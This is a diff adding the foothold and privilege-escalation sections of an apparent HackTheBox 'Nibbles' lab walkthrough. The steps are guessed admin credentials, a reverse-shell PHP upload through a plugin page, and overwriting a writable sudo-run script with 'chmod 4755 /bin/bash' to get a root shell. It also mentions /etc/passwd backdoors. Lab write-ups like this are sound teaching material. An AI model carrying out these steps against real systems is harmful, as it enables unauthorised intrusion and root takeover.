@@ -94,8 +94,87 @@ Hmm, soo many interesting files. After travelling through them manually, we can 
 </users>
 ```
 
-- Using some guesses and a fact that in older HTB machines, generally teh name of machine is the password, I was able to login in admin.php with credentials `admin:nibbles`.
+
+## Initial foothold
+
+- Using some guesses and a fact that in older HTB machines, generally the name of machine is the password, I was able to login in admin.php with credentials `admin:nibbles`.
 
 
-# the machine is broken on HTB. so i'll be continuing it after somedays. take a break.
+exploring for some time in admin dashboaard, we have a plugin page,where we can input images. and whenever i see someplace to upload file, i go for file upload vulnerability.
 
+![admin dashboard](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/admin_dashboard.png)
+
+
+![file upload](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/file_upload.png)
+
+Let's upload the reverseshell from pentest monkey. The code is getting stored in `/content/private/plugins/my_image` directory and is getting named as `image.php`.
+
+![reverse shell uploaded](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/revshell_uploaded.png)
+
+Opening the file, landed me to reverseshell on my netcat listener. after certain directory traversing and exploring i was able to get my user flag.
+
+![user flag explored](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/user_flag.png)
+
+
+## Privilege Escalation
+
+wohooo, we acomplished our first task. Now time to get root.
+
+`sudo -l` revealed that the user `nibbler` (that we are logged into) can execute `/home/nibbler/personal/stuff/monitor.sh` bash file with as root, without any password.
+
+```bash
+nibbler@Nibbles:/home/nibbler$ sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+Hmm, we have a file, that can be run by us with sudo previlege. I don't actually care what this bash script is doing, if i have permission to edit it, i can modify it and run any command that i wish. So let's check for the file permissions. But wait, from the previous emumeration, we got personal.zip file in nobbler directory. So we need to first unzip it and then check for file permission.
+
+```bash
+nibbler@Nibbles:/home/nibbler$ ls
+personal.zip  user.txt
+nibbler@Nibbles:/home/nibbler$ unzip personal.zip  
+Archive:  personal.zip
+   creating: personal/
+   creating: personal/stuff/
+  inflating: personal/stuff/monitor.sh  
+nibbler@Nibbles:/home/nibbler$ ls
+personal  personal.zip  user.txt
+nibbler@Nibbles:/home/nibbler$ cd personal
+nibbler@Nibbles:/home/nibbler/personal$ ls
+stuff
+nibbler@Nibbles:/home/nibbler/personal$ cd stuff
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
+monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -al monitor.sh 
+-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
+```
+
+Cool, we have all 777 permission for monitor.sh. Now it's cherry on a cake. We can modify it in any way we want and grab the root flag. Here I will be adding SUID bit to /bin/bash so that i can get bash shell as a root user. But, alternatively u can use some other tricks as well. For example:
+- directly cat out the flag from root directory 
+- add a backdoor by creating a new entry in /etc/passwd file with root privilege
+- run a reverse shell script to get another shell with root previlege and so on...
+
+
+so first i modified the content of monitor.sh using the command `echo "chmod 4755 /bin/bash" > monitor.sh`. Here `chmod 4755 /bin/bash` is setting a SUID bin to /bin/bash. then simply we can run the shell using `/bin/bash -p` command.
+
+```bash
+nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -al monitor.sh 
+-rwxrwxrwx 1 nibbler nibbler 21 Feb  6 11:37 monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "chmod 4755 /bin/bash" > monitor.sh 
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ /bin/bash -p
+bash-4.3# whoami
+root
+bash-4.3# cat /root/root.txt
+5cbd47bc5a874949a4e8589f2849679c
+```
+
+Hurray! we successfully acquired the root flag 🤩.
+
+Thankyou for reading my writeup cum walkthrough. Hope this was really informative and interesting for you.
+ ![nibbles pwned](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/nibbles/nibbles_pwned.png)
